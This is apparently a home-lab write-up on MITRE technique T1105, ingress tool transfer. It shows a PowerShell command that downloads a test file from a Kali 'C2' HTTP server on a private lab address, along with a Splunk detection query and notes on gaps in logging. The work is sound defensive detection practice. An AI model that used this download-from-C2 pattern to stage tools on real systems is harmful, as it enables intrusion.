# T1105 — Ingress Tool Transfer

## What This Attack Does

The attacker downloads tools or malware from an external server onto
the compromised machine. Once inside a network, attackers rarely bring
everything they need upfront — instead they download additional tools
as needed. This could be a keylogger, a credential dumper, ransomware,
or a remote access tool. Getting malware onto the machine is a critical
step in the attack chain.

## How I Simulated It

Tool: Manual PowerShell execution
Note: Atomic Red Team tests for T1105 were blocked by App Control
for Business policy on this machine. Instead the attack was simulated
manually using PowerShell Invoke-WebRequest to download a file from
the Kali C2 server running a Python HTTP server.

Command executed on Windows target:

Invoke-WebRequest -Uri "http://192.168.56.101:8080/test.txt" -OutFile "c:\temp\downloaded.txt"

Command executed on Kali C2 server:

echo "test file for T1105" > ~/test.txt
python3 -m http.server 8080

The Kali server confirmed the download with HTTP 200 OK response:
192.168.56.102 - "GET /test.txt HTTP/1.1" 200

## What Splunk Captured

Note: Sysmon EventCode=3 (Network Connection) logging was not enabled
in the Sysmon configuration used in this lab. The network connection
event was therefore not captured in Splunk.

In a production SOC environment this technique would be detected via:
- Sysmon EventCode=3 showing outbound connection from powershell.exe
- Network monitoring tools flagging unusual outbound connections
- Firewall logs showing the file transfer

## SPL Detection Query

index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=3 Image="*powershell.exe"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='DestinationIp'>(?P<DestinationIp>[^<]+)"
| rex field=_raw "Name='DestinationPort'>(?P<DestinationPort>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, DestinationIp, DestinationPort

## Result

Attack simulation was successful — file was downloaded from Kali to
Windows as confirmed by the Python HTTP server 200 OK response.
Splunk detection was limited due to Sysmon network logging not being
enabled in this lab configuration.

## Screenshot

<img width="941" height="77" alt="T1105-windows png" src="https://github.com/user-attachments/assets/5e65b9f0-316d-4f50-8cca-30b326ffe20e" />
<img width="1907" height="90" alt="T1105-kali png" src="https://github.com/user-attachments/assets/ed7518ad-69c6-461a-ad63-6ea56c9f55a9" />
